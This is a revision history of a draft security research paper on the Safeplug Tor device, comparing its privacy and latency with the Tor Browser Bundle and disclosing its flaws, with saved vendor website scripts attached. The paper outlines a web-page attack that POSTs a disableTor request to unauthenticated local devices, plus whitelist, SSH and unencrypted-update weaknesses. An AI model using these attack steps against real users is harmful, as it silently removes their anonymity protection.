+This is explained on the Tor Project's website; they explain that disabling javascript causes some web pages to break, making the browser less user-friendly.
+The user has the option to enable javascript by simply clicking a button.
+Our data shows that the Tor Browser is a less expensive alternative to the Safeplug, and provides more privacy protections.
+
 \section{Vulnerabilities}

### 2014-05-28 foci/paper.tex
final submitted version of paper in foci/ folder

@@
 \usepackage{subfigure}
+\usepackage{paralist}
+%\usepackage[compact]{titlesec}
+%\titlespacing{\section}{0pt}{2ex}{2ex}
+%\titlespacing{\subsection}{0pt}{1ex}{1ex}
+%\titlespacing{\subsubsection}{0pt}{0.5ex}{0ex}
 
@@
 Privacy on the Internet is becoming increasingly important as users realize how vulnerable they are to surveillance and theft of their data.
-A recent Pew study listed compromised emails/accounts, harassment, and stolen Social Security Numbers, bank information, and credit card numbers as some of the results of online visibility; according to the study, 86\% of internet users have tried to become more anonymous online~\cite{pew}.
+A recent Pew study listed compromised emails/accounts, harassment, stolen Social Security Numbers, bank information, and credit card numbers as some of the results of online visibility; according to the study, 86\% of internet users have tried to become more anonymous online~\cite{pew}.
 Despite this, users do not believe that they have the tools to solve this problem.
@@
 
-\begin{itemize} \setlength{\itemsep}{.2mm}
+\begin{compactitem} \setlength{\itemsep}{.2mm}
 \item The Safeplug functions as a HTTP proxy for the browser, which then uses Tor for outgoing traffic.
@@
 \item The Safeplug has a higher web request latency than that of the Tor Browser Bundle.
-\item The Tor Browser Bundle provides more protection than the use of Privoxy, and therefore the use of the Safeplug.
-\end{itemize}
+\item The use of the Safeplug provides less protection than the use of the Tor Browser Bundle.
+\end{compactitem}
 
 Pogoplug made use of good security principles by using auditable open source software on their device, and has the laudable goal of making online security the standard for more users.
-However, there are other technologies available that aim to provide the same functionality, such as the Tor Browser Bundle; additionally, this technology is free.
+However, there are other technologies available that aim to provide the same functionality, such as the Tor Browser Bundle, which can be used free of charge.
 In order to determine if there is a market for the Safeplug, we measure the privacy implications between the different technologies.
@@
 
-\section{Background}
-{\bf Safeplug.} Safeplug \cite{safeplug}, is a product that launched in December of 2013 from the cloud storage company Pogoplug, that offers any user the option of using Tor \cite{torproject} without having to know about it or how it works.
+%\section{Background}
+%Safeplug \cite{safeplug}, is a product that launched in December of 2013 from the cloud storage company Pogoplug, that offers any user the option of using Tor \cite{torproject} without having to know about it or how it works.
 It allows users to browse the web from their own standard web browser with “complete security and anonymity” for the cheap price of \$49.
@@
 
-{\bf Pogoplug.} Pogoplug, a subsidary of Cloud Engines, also offers secure file server or file storage technologies for home networks, called Pogoplug.
+%{\bf Pogoplug.} Pogoplug, a subsidary of Cloud Engines, also offers secure file server or file storage technologies for home networks, called Pogoplug.
 Based on our examination of the box discussed below, we suspect that a recent version of the Pogoplug hardware was relabeled as Safeplug and simply uses different software to achieve its newly branded purpose.
@@
 \section{Design and Operation of Safeplug}
+Safeplug \cite{safeplug} offers any user the option of using Tor \cite{torproject} without having to know about it or how it works.
+It allows users to browse the web from their own standard web browser with “complete security and anonymity” for the cheap price of \$49.
+Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user's router and the Internet \cite{wired}.
+Pogoplug's marketing pitch centers around the protection of users' IP addresses by using Tor \cite{bittech}.
 
-\subsection{Hardware}
-Before investigating the software, we took apart one of the two Safeplug devices we purchased in order to see the physical components.
+%\subsection{Hardware}
+%Before investigating the software, we took apart one of the two Safeplug devices we purchased in order to see the physical components.
 Figure~\ref{fig:top} shows the top of the board and Figure~\ref{fig:bottom} shows the bottom.
@@
 
-\begin{figure}[ht]
- \centering
- \subfigure[Top of board.]{
-  \includegraphics[width=.2\textwidth]{safeplug_listed_top}
-   \label{fig:top}
-   }
- \subfigure[Bottom of board.]{
-  \includegraphics[width=.2\textwidth]{safeplug_hardware_new}
-   \label{fig:bottom}
-   }
- \label{fig:circuit}
- \caption[Safeplug circuit board after the teardown.  The explanation of the components is in the text.]{%
-  Safeplug circuit board after the teardown.  The explanation of the components is in the text.}
-\end{figure}
+%\begin{figure}[ht]
+% \centering
+% \subfigure[Top of board.]{
+%  \includegraphics[width=.2\textwidth]{safeplug_listed_top}
+%   \label{fig:top}
+%   }
+% \subfigure[Bottom of board.]{
+%  \includegraphics[width=.2\textwidth]{safeplug_hardware_new}
+%   \label{fig:bottom}
+%   }
+% \label{fig:circuit}
+% \caption[Safeplug circuit board after the teardown.  The explanation of the components is in the text.]{%
+%  Safeplug circuit board after the teardown.  The explanation of the components is in the text.}
+%\end{figure}
 
@@
 \begin{center}
+\small
   \begin{tabular}{|l|c|c|c|}
@@
 
-Table \ref{versions} shows the software used by the device, the corresponding version of the software, as well as the date of that versions release and if it is up to date.
+Table \ref{versions} shows the software used by the device, the corresponding version of the software, the date of that version's release, and if it is up to date as of May 2014.
 There are many known vulnerabilities in the pieces of software that are not up to date.
@@
 
-When a user modifies the settings page, Javascript on the settings page generates a POST request to {\tt xspctrl}, which is a script running via CGI in Lighttpd.
+This software can be understood by explaining what happens when a user modifies the Safeplug settings page.
+Javascript on the settings page generates a POST request to {\tt xspctrl}, which is a script running via CGI in Lighttpd.
 The CGI handler copies a number of environment variables, and then forks and runs {\tt xspctrl} via {\tt execve} (in the constructed environment).
@@
 
-\subsection{Networking}
-The Lighttpd, Privoxy, and Dropbear software give some indication of the networking services on the device.
+%\subsection{Networking}
+%The Lighttpd, Privoxy, and Dropbear software give some indication of the networking services on the device.
 We used \texttt{nmap} to scan the ports.
@@
 The Safeplug configuration files can be found in \verb!/opt/xce/etc!
-and include \verb!sp.conf!
-and \verb!sp_version!
-and \verb!sp_torexceptions!.
+and include \verb!sp.conf!, \verb!sp_version!, and \verb!sp_torexceptions!.
 The first contains all of the configuration details: whether to use Tor, whether to block ads, and whether to act as a Tor relay or exit relay.
@@
 \section{Usability}
-Several aspects of the user experience of the Safeplug also affect the security of the device.  The Safeplug advertisements highlighted the ease of use, but omit important details.
+Several aspects of the user experience of the Safeplug also affect the security of the device.
 
@@
 
-The Safeplug uses several pieces of open source software.
+One of the topics the TOS discusses is the use of open source software.
 A standard term of many open source licenses states that a company that uses the open source software must list the software used and its license, as well as the open source code of their own software that uses the license.
 The TOS contains a link to a page that would supposedly comply with this requirement: \url{http://pogoplug.com/home-en-developers-open-source.html} but the link is dead; instead, the reader sees a 404 error \cite{safeplug}.
-This dead link was noted by some members of the Tor-talk mailing list in November 2013 and has not been fixed as of May 2014 \cite{tormailinglist}.
-Pogoplug does maintain an open source page at \url{https://pogoplug.com/opensource}, which describes several pieces of software for the Safeplug: the bootloader, Linux kernel, XCE kernel support driver, glibc, BusyBox, and a Safeplug source bundle.
-However, there is no way to find this page from the Terms of Service or the Safeplug website.
+There is an open source page, which describes several pieces of software used by the Safeplug; however, there is no way to find this page from the Terms of Service or the Safeplug website.
 
 \subsection{Activation and Setup}
-The first step was to plug Safeplug into our router and activate our device.
+%The first step was to plug Safeplug into our router and activate our device.
 We followed the simple instructions, activated our device, and then ended on the configurations page.
 The configurations page shows a variety of platforms and browsers, shown in Table \ref{table_example}, and links to proxy configuration instructions for each one.
-The platforms presented include many popular desktop and mobile platforms.
 For every browser on every client device that the user wants to protect, they must set up the Safeplug as the browser's HTTP proxy and ensure that the proxy stays set up when the browser is updated or re-installed.
+
+First, we activated the device by following simple instructions.
+Next, we followed the configuration instructions based on our specific platform and browser (the options are shown in Table \ref{table_example}) to set up the Safeplug as our browser's HTTP proxy.
+The last step was to modify the settings; this page is shown in Figure~\ref{fig:settings}.
+We can turn Tor on/off, turn ad-blocking on/off, and turn relay node ability on/off (and if on, an additional option appeared to allow the device to be an exit relay).
+Additionally, we can specify ``white-listed'' domains that will be connected to directly even if Tor is turned on, without going through the Tor network.
 
@@
 \centering
+\small
 	\begin{tabular}{|c|c|}
@@
 
-After we finished configuring our Safeplug and browser, we were taken to the Safeplug settings page.
-This page is shown in Figure~\ref{fig:settings}.
-This page allows the user to set a number of options on the device, including turning Tor on/off, turning ad-blocking on/off, and turning relay node ability on/off (and if on, an additional option appeared to allow the device to be an exit relay).
-Additionally, the user can specify ``white-listed'' domains that will be connected to directly even if Tor is turned on, without going through the Tor network.
-The Safeplug FAQ website describes this as an option for sites like banks that prevent access from foreign IP addresses\cite{safeplug}.
-
-\begin{figure*}
+\begin{figure}
   \centering
-  \includegraphics[width=.65\textwidth]{settings_with_exit}
+  \includegraphics[width=.5\textwidth]{settings_with_exit}
   \caption{Safeplug settings page.  The last button ``Allow Exit'' only appears if the relay option above has been turned on.}
   \label{fig:settings}
-\end{figure*}
+\end{figure}
 
-\subsection{Explanation of Tor Configuration Options}
-\label{port9001}
-One of Safeplug's configurations is the use of the device as a Tor relay node in the Tor network.  When the device is initially set up, the default setting is to not use it as a relay node.
+%\subsection{Explanation of Tor Configuration Options}
+%\label{port9001}
 
-The settings page describes Tor in an extremely basic way:
+%The settings page describes Tor in an extremely basic way:
 
-\begin{quotation}
-``Safeplug uses the Tor network to secure your Internet connection.
+%\begin{quotation}
+%``Safeplug uses the Tor network to secure your Internet connection.
 Tor works by routing your Internet through a series of random destinations, much like driving a twisty, complicated route to throw off someone who is following you, making it impossible for websites and organizations to identify the source or destination of Internet traffic.''
-\end{quotation}
+%\end{quotation}
 
-On the other hand, it assumes a much higher level of knowledge about networks for users trying to configure a relay:
-\begin{quotation}
-You must forward inbound traffic on port 9001 to [IP-of-Safeplug]. For help configuring your router, click here.''
-\end{quotation}
+%On the other hand, it assumes a much higher level of knowledge about networks for users trying to configure a relay:
+%\begin{quotation}
+%You must forward inbound traffic on port 9001 to [IP-of-Safeplug]. For help configuring your router, click here.''
+%\end{quotation}
 
-The link provided is to an advertisement-filled and confusing website.
+%The link provided is to an advertisement-filled and confusing website.
 
+It is important to note that there is no explanation of relay or exit nodes.
 Using Safeplug as an exit node has possible legal repercussions.
 As an exit relay, all traffic that exits the node can be traced back to the Safeplug's IP address; it is likely that some of this traffic contains illegal information or is part of illicit activities.
-The Tor Project recommends not running an exit relay from a user's home: ``If law enforcement becomes interested in traffic from your exit relay, it's possible that officers will seize your computer.
-For that reason, it's best not to run your exit relay in your home or using your home Internet connection~\cite{law}.''  Considering that the Safeplug is intended for home use, it is a poor design choice to allow the user to use it as an exit relay without providing the user with any contextual information.
+The Tor Project recommends not running an exit relay from a user's home.
+Considering that the Safeplug is intended for home use, it is a poor design choice to allow the user to use it as an exit relay without providing the user with any contextual information.
 
-\subsection{Internet Use}
-\label{inetuse}
+%\subsection{Internet Use}
+%\label{inetuse}
 
@@
 
-Next, we examined popular webpages, with an eye for changes in the user experience.
+%Next, we examined popular webpages, with an eye for changes in the user experience.
 A user would probably decide not to use Safeplug if they could not read their web pages (due to a different language), or if they could not log into their accounts (some web sites will lock a user out if they try to log in from multiple countries in a short time period).
@@
 \subsection{Cookies}  
-While browsing the Internet in a fresh browser session, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ widget in a different tab.
-When we clicked on the Google+ widget, it knew who we were; so we can confirm that a cookie associated with the login was sent to the second Google+ page.
-We experienced the same situation with Facebook and its corresponding ``like'' button.
-This was confirmed by using FourthParty, a plugin developed by Jonathan Mayer to collect information about cookies and other browsing data~\cite{fourthparty}.
-
-This is clearly not the perfect ``anonymity'' that Safeplug promised in their publicity.
-Although normal use does follow this model of persisting logged in status across browser tabs and sessions, a user concerned about anonymity and seeing each session coming up differently (e.g., German then Swedish) might mistakenly believe that they do not have to log out of their social media accounts to preserve their anonymity when accessing other websites.
-
+While browsing the Internet in a fresh browser session, we used FourthParty, a plugin developed by Jonathan Mayer to collect information about cookies and other browsing data, to confirm the presence of first-party cookies.
 More interesting and damaging to the user's control over their anonymity would be third-party cookies because the user cannot remove those just by logging out.
@@
 One of the sessions used the ad-block feature of the Safeplug and the other did not.
-After analyzing data from Fourthparty, we found many third-party cookies in both sessions.
-These included cookies from: abmr.net, bizographics.com, krxd.net, and bluekai.com among many others.
+We found many third-party cookies in both sessions; these included cookies from: abmr.net, bizographics.com, krxd.net, and bluekai.com among many others.
 The ad-block functionality on the Safeplug reduced, but did not eliminate, these third-party cookies.
@@
 The presence of the Safeplug, as an HTTP proxy, should be completely undetectable by the fingerprinting service because HTTP is designed to make proxies transparent.
-Unlike the Tor Browser Bundle, Safeplug users do not even have the fingerprints of other users of the service to help hide their fingerprints.
+Unlike the Tor Browser, Safeplug users do not have the fingerprints of other users of the service to help hide their fingerprints.
 Allowing the user to use their own browsers significantly increases the amount of variation and customization between users and therefore the likelihood of having a unique fingerprint.
-This danger to anonymity (unlike cookies) is not even mentioned in the Safeplug FAQ page~\cite{safeplug}.
 
@@
 Similarly, if turning Tor on, but not ad-blocking, adds a significant time delay, the user may only turn on the ad-blocking feature (without Tor).
-We recorded the time for a web request on the following settings:
+We recorded the time for a web request on a variety of settings, shown in Figure~\ref{fig:latency2}.
 
-\begin{itemize} \setlength{\itemsep}{.2mm}
-\item Plain Firefox (no use of the Safeplug device)
-\item Firefox, no Tor, no ad-blocking (traffic running through the Safeplug device)
-\item Firefox, Tor, no ad-blocking
-\item Firefox, Tor, ad-blocking
-\item Firefox, no Tor, ad-blocking
-\item Tor Browser Bundle with Safeplug (all settings off)
-\item Tor Browser Bundle
-\end{itemize}
+%\begin{itemize} \setlength{\itemsep}{.2mm}
+%\item Plain Firefox (no use of the Safeplug device)
+%\item Firefox, no Tor, no ad-blocking (traffic running through the Safeplug device)
+%\item Firefox, Tor, no ad-blocking
+%\item Firefox, Tor, ad-blocking
+%\item Firefox, no Tor, ad-blocking
+%\item Tor Browser Bundle with Safeplug (all settings off)
+%\item Tor Browser Bundle
+%\end{itemize}
 
@@
 The Tor Browser Bundle may be a better solution than the Safeplug if it has fewer privacy implications.
-The differentiating factor between the Safeplug and the Tor Browser Bundle is the use of Privoxy; in order to determine the effectiveness of the Safeplug in comparison to that of the Tor Browser Bundle, we must find the value of Privoxy in terms of privacy.
+The differentiating factor between the Safeplug and the Tor Browser Bundle is the use of Privoxy; in order to determine the effectiveness of the Safeplug in comparison to that of the Tor Browser Bundle, we must measure the value of Privoxy.
 We ran a measurement study of the privacy implications of the use of Firefox, Firefox with Privoxy, and the Tor Browser Bundle; our data was collected by running crawls on the Alexa Top 100 sites in each of the specified browsers~\cite{alexa}.
 All browser configurations were modified with Pagestats \cite{pagestats} and Cookie Manager+ \cite{cookiemonster} to aggregate information about third party requests, javascript objects, flash objects, and third party cookies.
-Table \ref{tbb} shows the average number per page of: third party domains accessed, javascript objects received from third parties, flash objects received from third parties, and cookies received from third parties.
+Table \ref{tbb} shows the per page fraction of: third party domains accessed, javascript objects received from third parties, flash objects received from third parties, and cookies received from third parties.
 
@@
 \renewcommand{\arraystretch}{1.3}
-\caption{Privacy implications of using Firefox, Privoxy, or the Tor Browser Bundle; the numbers represent the average number per page.}
+\caption{Privacy implications of using Firefox, Privoxy, or the Tor Browser Bundle; the numbers represent the fraction of the corresponding privacy implications per page.}
 \label{tbb}
 \centering
+\small
 	\begin{tabular}{| p{1.85cm} | p{1.3cm} | p{1.25cm} | p{.7cm} | p{1cm} |}
@@
 
-It is clear to see that the Tor Browser Bundle had the fewest privacy implications in most categories; it's interesting to note that the Tor Browser Bundle did not receive any cookies, where as both other configurations received a significant number of them.
+It is clear that the Tor Browser Bundle had the fewest privacy implications in most categories.
 The one category where Privoxy performed better than the Tor Browser Bundle is in the number of javascript objects received from third parties; this can be attributed to the fact that our measurements were taken using the default settings for the Tor Browser Bundle, which allows javascript (NoScript is disabled)~\cite{torproject}.
@@
 The user has the option to enable javascript by simply clicking a button.
-Our data shows that the Tor Browser is a less expensive alternative to the Safeplug, and provides more privacy protections.
+This shows that the Tor Browser is a less expensive alternative to the Safeplug, and provides more privacy protections.
 
@@
 Functional calls to this script include the ability to enable and disable all of the Safeplug settings, including Tor, ad block, and Tor relay.
-None of them require any arguments in the POST string.
+None of them require any authentication.
 
-\begin{figure*}
+\begin{figure}
   \centering
-  \includegraphics[width=.75\textwidth]{disabletor2}
+  \includegraphics[width=.5\textwidth]{disabletor2}
   \caption{Disabling Tor as an RPC attack.}
   \label{disable}
-\end{figure*}
+\end{figure}
 
@@
 
-Since the RPC version of the attack just involves basic Internet tools (the ability to send a POST request), the attacker could also be any kind of device on the local network, or the local gateway if it is compromised.
+Since the RPC version of the attack just involves basic Internet tools (the ability to send a POST request), the attacker could also be any kind of device on the local network, or the local gateway itself, if it is compromised.
 
@@
 This whitelist attack is particularly dangerous because the change is silent and much harder for the user to notice the addition of a single website to the whitelist than a global loss of Tor.
-(Removal of a webpage from the whitelist is likely to produce visible usability problems.)
 
@@
     Another command available to the RPC server is enabling SSH to the device.
-SSH instructions for Pogoplug's other device (called Pogoplug) are widely available online and an email in the Tor-talk mailing list confirmed the instructions \cite{ceadmin}:
+SSH instructions for Pogoplug's other device (called Pogoplug) are widely available online and an email in the Tor-talk mailing list confirmed the instructions are the same for the Safeplug \cite{ceadmin}:
 %\begin{lstlisting}
@@
 \section{Related Work}
-To our knowledge, there has been no other study analyzing the security of Pogoplug's Safeplug device.
-However there has been much prior research on the primary technology that the device uses, Tor, as well as the vuvlnerability of fingerprinting.
+To our knowledge, there has been no other study analyzing the security of Pogoplug's Safeplug device.  However, there has been much prior research on Tor and fingerprinting.
 
@@
 These results can be extended to the security of Safeplug.
-Because Safeplug uses Tor to anonymize users, it may be susceptible to this type of fingerprinting attack.
+Because Safeplug uses Tor to anonymize users, it may be susceptible to fingerprinting attacks.
 

### 2014-06-30 foci/paper.tex
added saved copy of safeplug website, made some of the reviewers' changes

@@
 Privacy on the Internet is becoming increasingly important as users realize how vulnerable they are to surveillance and theft of their data.
-A recent Pew study listed compromised emails/accounts, harassment, stolen Social Security Numbers, bank information, and credit card numbers as some of the results of online visibility; according to the study, 86\% of internet users have tried to become more anonymous online~\cite{pew}.
+A recent Pew study listed compromised emails/accounts, harassment, stolen Social Security Numbers, bank information, and credit card numbers as some of the results of online visibility; according to the study, 86\% of Internet users have tried to become more anonymous online~\cite{pew}.
 Despite this, users do not believe that they have the tools to solve this problem.
@@
 \section{Design and Operation of Safeplug}
-Safeplug \cite{safeplug} offers any user the option of using Tor \cite{torproject} without having to know about it or how it works.
-It allows users to browse the web from their own standard web browser with “complete security and anonymity” for the cheap price of \$49.
+Safeplug \cite{safeplug} offers any user the option of using Tor \cite{tor} without having to know about it or how it works.
+It allows users to browse the web from their own standard web browser with “complete security and anonymity,” and it costs \$49.
 Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user's router and the Internet \cite{wired}.
@@
 This software can be understood by explaining what happens when a user modifies the Safeplug settings page.
-Javascript on the settings page generates a POST request to {\tt xspctrl}, which is a script running via CGI in Lighttpd.
+JavaScript on the settings page generates a POST request to {\tt xspctrl}, which is a script running via CGI in Lighttpd.
 The CGI handler copies a number of environment variables, and then forks and runs {\tt xspctrl} via {\tt execve} (in the constructed environment).
@@
 The TOS contains a link to a page that would supposedly comply with this requirement: \url{http://pogoplug.com/home-en-developers-open-source.html} but the link is dead; instead, the reader sees a 404 error \cite{safeplug}.
-There is an open source page, which describes several pieces of software used by the Safeplug; however, there is no way to find this page from the Terms of Service or the Safeplug website.
+There is an open source page at \url{http://pogoplug.com/opensource}, which describes several pieces of software used by the Safeplug; however, there is no way to find this page from the Terms of Service or the Safeplug website.
 
@@
 \subsection{Cookies}  
-While browsing the Internet in a fresh browser session, we used FourthParty, a plugin developed by Jonathan Mayer to collect information about cookies and other browsing data, to confirm the presence of first-party cookies.
+While browsing the Internet in a fresh browser session, we used FourthParty, a plugin developed by Jonathan Mayer to collect information about cookies and other browsing data, to confirm the presence of first-party cookies~\cite{fourthparty}.
 More interesting and damaging to the user's control over their anonymity would be third-party cookies because the user cannot remove those just by logging out.
@@
 We ran a measurement study of the privacy implications of the use of Firefox, Firefox with Privoxy, and the Tor Browser Bundle; our data was collected by running crawls on the Alexa Top 100 sites in each of the specified browsers~\cite{alexa}.
-All browser configurations were modified with Pagestats \cite{pagestats} and Cookie Manager+ \cite{cookiemonster} to aggregate information about third party requests, javascript objects, flash objects, and third party cookies.
-Table \ref{tbb} shows the per page fraction of: third party domains accessed, javascript objects received from third parties, flash objects received from third parties, and cookies received from third parties.
+All browser configurations were modified with Pagestats \cite{pagestats} and Cookie Manager+ \cite{cookiemonster} to aggregate information about third party requests, JavaScript objects, flash objects, and third party cookies.
+Table \ref{tbb} shows the per page fraction of: third party domains accessed, JavaScript objects received from third parties, flash objects received from third parties, and cookies received from third parties.
 
@@
 	\hline
-		Configuration & Third Party Domains & Javascript & Flash & Cookies \\ \hline
+		Configuration & Third Party Domains & JavaScript & Flash & Cookies \\ \hline
 		Plain Firefox	& 0.64 & 0.01 & 0.01 & 0.88 \\ \hline
@@
 It is clear that the Tor Browser Bundle had the fewest privacy implications in most categories.
-The one category where Privoxy performed better than the Tor Browser Bundle is in the number of javascript objects received from third parties; this can be attributed to the fact that our measurements were taken using the default settings for the Tor Browser Bundle, which allows javascript (NoScript is disabled)~\cite{torproject}.
-This is explained on the Tor Project's website; they explain that disabling javascript causes some web pages to break, making the browser less user-friendly.
-The user has the option to enable javascript by simply clicking a button.
+The one category where Privoxy performed better than the Tor Browser Bundle is in the number of JavaScript objects received from third parties; this can be attributed to the fact that our measurements were taken using the default settings for the Tor Browser Bundle, which allows JavaScript (NoScript is disabled)~\cite{torproject}.
+This is explained on the Tor Project's website; they explain that disabling JavaScript causes some web pages to break, making the browser less user-friendly.
+The user has the option to enable JavaScript by simply clicking a button.
 This shows that the Tor Browser is a less expensive alternative to the Safeplug, and provides more privacy protections.
@@
 If the attacker does not know the IP address of the Safeplug, he can perform an exhaustive search on the address space.
-We implemented this attack with less than 20 lines of Javascript code.
+We implemented this attack with less than 20 lines of JavaScript code.
 The following steps are necessary for the attack:
@@
 \begin{enumerate} \setlength{\itemsep}{.2mm}
-\item Set up a web page with the Javascript code, which will send the POST request of the following format to all addresses in the common ranges: \url{http://<IP address>/svc/xspctrl/disableTor}.
+\item Set up a web page with the JavaScript code, which will send the POST request of the following format to all addresses in the common ranges: \url{http://<IP address>/svc/xspctrl/disableTor}.
 \item Send the malicious link to a user in the targeted private network.
@@
 \label{dnsspoof}
-An additional dangerous class of vulnerabilities comes from the the use of insecure TCP rather than any kind of encrypted communication during the software update process.
+An additional dangerous class of vulnerabilities comes from the lack of HTTPS rather than any kind of encrypted communication during the software update process.
 We discovered that the update script is downloaded via TCP from an IP address provided by the Pogoplug servers.
@@
 One type of client that deserves special attention is a mobile phone user.
+Although the Tor Project publishes an Android app called Orbot on the Android Market, which is supported for Android versions 2.3 and later, there are no official Tor apps for iPhones or other non-Android devices~\cite{orbot,amorbot}.
 Safeplug provides proxy functionality and instructions for Safari on the iPhone and Chrome on Android.

### 2014-06-30 safeplug_website/safeplug_homepage_files/128344401.js

@@ -1,0 +1,263 @@
+
+
+
+
+
+
+
+optimizelyCode = function(){
+var DATA={"public_suffixes":{"pogoplug.com":["pogoplug.com","www.pogoplug.com"]},"log_host":"log.optimizely.com","goal_expressions":{"776150738":["^(https?://)?(www\\.)?pogoplug\\.com\\/promo\\/promotrial/?(\\?.*)?(#.*)?$"],"582490852":["^optimizelyyearlysub$"],"227986758":["^free\\_plan\\_selected$"],"298860296":["^home\\_get\\_started\\_button$"],"228465225":["^yearly\\_plan\\_selected$"],"765671607":["^button$"],"574662860":["^get\\_pogoplug\\_free\\_clicks$"],"756021170":["^getitfree\\_clicks$"],"571511630":["^yearly\\_clicks$"],"1015041437":["^button\\_clicks$"],"566132872":["^optimizelymonthlysub$"],"298855442":["^sign\\_in$"],"297842419":["^home\\_\\-\\_get\\_started\\_bottom\\_button$"],"574421001":["^free\\_clicks$"],"128379223":["^engagement$"],"581083064":["^monthly\\_clicks$"],"228311549":["^monthly\\_plan\\_selected$"],"285317086":["^\\/cloud\\_continue\\_button$"],"222757727":["^create\\_account$"]},"api_host":"api.optimizely.com","variations":{"791433473":{"code":"$(\".xce-body > .xce-h1\").html(\"The Best iCloud Alternative\");\n$(\".xce-heroinfo > .xce-h2\").html(\"Unlimited storage for all your devices. Automatic backups. Simple.\");\n$(\".xce-hero-btnbox > .xce-button\").html(\"Try It Free\");\n$(\".xce-body > .xce-h1\").html(\"The Best iCloud Storage\");\n$(\".xce-heroinfo > .xce-h2\").html(\"Unlimited storage and automatic backups for all your devices. $5 for 6 months.\");\n$(\".xce-body > .xce-h1\").html(\"The Best Cloud Storage\");","name":"Original"},"758993026":{"name":"Original"},"770320260":{"name":"Get It Free"},"773320583":{"name":"Original"},"754864650":{"code":"$(\".xce-body > .xce-h1\").replaceWith(\"<div class=\\\"xce-h1\\\">Easily Transfer Photos</div>\");\n$(\".xce-heroinfo > .xce-h2\").replaceWith(\"<div class=\\\"xce-h2
[…]

### 2014-06-30 safeplug_website/safeplug_homepage_files/ppe.js

@@ -1,0 +1,1 @@
+(function(ns){var svcurl=window.location.protocol+"//"+window.location.host+"/svc/api/";var valtoken_incookie=true;var ECODE_NOTAUTHORIZED=606;var ECODE_NOTAVAIL=806;var ECODE_USER_DISABLED=833;var ECODE_ALREADYEXISTS=808;function log(str){try{console.log(str)}catch(e){}}var _rpcPending=0;var valtoken=null;function $(n){if(typeof(n)=="string"){return document.getElementById(n)}else{return n}}function dce(t,i,c,ch){var el=document.createElement(t);if(t=="a"){el.href="#"}if(i){el.id=i}if(c){el.className=c}if(ch){if(ch.constructor==Array){for(var i=0;i<ch.length;i++){if(ch[i]){el.appendChild(ch[i])}}}else{el.appendChild(ch)}}return el}function dcd(c,ch,i){var el=dce("div",i,c,ch);return el}function dca(oc,i,c,t,ch){var a=dce("a",i,c,ch);a.href="#";if(oc){a.onclick=oc}if(t){a.title=t}return a}function dci(u,i,c,a){var im=dce("img",i,c);im.border="0";if(a){im.alt=a}if(u){im.src=u}return im}function dcc(i,c,checked){var el=dce("input",i,c);el.type="checkbox";el.checked=checked?true:false;return el}function dcr(i,c,n,checked){var el=dce("input",i,c);el.type="radio";el.name=n;el.checked=checked?true:false;return el}function dcl(fid,c){var l=dce("label",null,c);l.htmlFor=fid;return l}function dctn(t){return document.createTextNode(t)}function dco(l,v,i,c){var o=dce("option",i,c);o.value=v;o.appendChild(dctn(l));return o}function rac(e,s){var el=$(e);if(el){while(el.hasChildNodes()){var c=el.firstChild;el.removeChild(c)}if(s&&el.parentNode){el.parentNode.removeChild(el)}}}function lCN(e){var cnl=[];var el=$(e);if(el){if(el.className){cnl=el.className.split(" ")}}return cnl}function irCN(e,cn,cnl){if(cnl===undefined||cnl===null){cnl=lCN(e)}for(var i=0;i<cnl.length;i++){if(cnl[i]==cn){cnl.splice(i,1);i--}}return cnl}function hCN(e,cn){var r=false;var el=$(e);if(el){var cnl
[…]

### 2014-07-01 foci/paper.tex
more changes to FOCI paper

@@
 Similarly, if turning Tor on, but not ad-blocking, adds a significant time delay, the user may only turn on the ad-blocking feature (without Tor).
-We recorded the time for a web request on a variety of settings, shown in Figure~\ref{fig:latency2}.
+We recorded the time for a web request on the following settings:
 
-%\begin{itemize} \setlength{\itemsep}{.2mm}
-%\item Plain Firefox (no use of the Safeplug device)
-%\item Firefox, no Tor, no ad-blocking (traffic running through the Safeplug device)
-%\item Firefox, Tor, no ad-blocking
-%\item Firefox, Tor, ad-blocking
-%\item Firefox, no Tor, ad-blocking
-%\item Tor Browser Bundle with Safeplug (all settings off)
-%\item Tor Browser Bundle
-%\end{itemize}
+\begin{itemize} %\setlength{\itemsep}{2mm}
+\item Plain Firefox (no use of the Safeplug device)
+\item Firefox, no Tor, no ad-blocking (traffic running through the Safeplug device)
+\item Firefox, Tor, no ad-blocking
+\item Firefox, Tor, ad-blocking
+\item Firefox, no Tor, ad-blocking
+\item Tor Browser Bundle with Safeplug (all settings off)
+\item Tor Browser Bundle
+\end{itemize}
 
-For each of the settings, we took 20 measurements; Figure~\ref{fig:latency2} shows the average time of a web request on each of the specified settings for three different web pages.
+For each of the settings, we took 20 measurements [TODO: explain why only 20 measurements]; Figure~\ref{fig:latency2} shows the average time of a web request on each of the specified settings for three different web pages.
 When taking these measurements, we loaded the page, but did not scroll; in many cases more objects are loaded when scrolling down a page.
@@
 
-\begin{figure}
+\begin{figure*}
   \centering
@@
   \label{fig:latency2}
-\end{figure}
+\end{figure*}
+
+TODO: talk about variation within specific categories for each site.
+
+The average web request time for accessing \url{www.washingtonpost.com} is greatest on the same settings that the average web request time for \url{www.google.com} is the least.
+This setting did not include ad-blocking, and therefore \url{www.washingtonpost.com} had to render each ad (which it requested through Tor); \url{www.google.com} does not have any ads.
+
+The latency of using the Safeplug with Firefox, Tor, and ad-blocking is comparable to that of using the Tor Browser Bundle.
+For all three web pages, the Tor Browser Bundle had slightly lower latency; the Tor Browser Bundle blocks scripts, and for web pages such as \url{www.coca-cola.com}, this provides a significant latency decrease.
+This, in conjunction with the fact that the Tor Browser Bundle is free and is issued directly from The Tor Project, shows a convincing argument to use the Tor Browser Bundle in place of the Safeplug.
+
+TODO: mention caveat that we might just be seeing variation in circuit performance because close timing of fetches.
 
@@
 It is clear that the Tor Browser Bundle had the fewest privacy implications in most categories.
-The one category where Privoxy performed better than the Tor Browser Bundle is in the number of JavaScript objects received from third parties; this can be attributed to the fact that our measurements were taken using the default settings for the Tor Browser Bundle, which allows JavaScript (NoScript is disabled)~\cite{torproject}.
+The one category where Privoxy performed better than the Tor Browser Bundle is in the number of JavaScript objects received from third parties; this can be attributed to the fact that our measurements were taken using the default settings for the Tor Browser Bundle, which allows JavaScript~\cite{torproject}.
 This is explained on the Tor Project's website; they explain that disabling JavaScript causes some web pages to break, making the browser less user-friendly.
-The user has the option to enable JavaScript by simply clicking a button.
+The user has the option to disable JavaScript by simply clicking a button.
 This shows that the Tor Browser is a less expensive alternative to the Safeplug, and provides more privacy protections.
@@
 
+\section{Future Work}
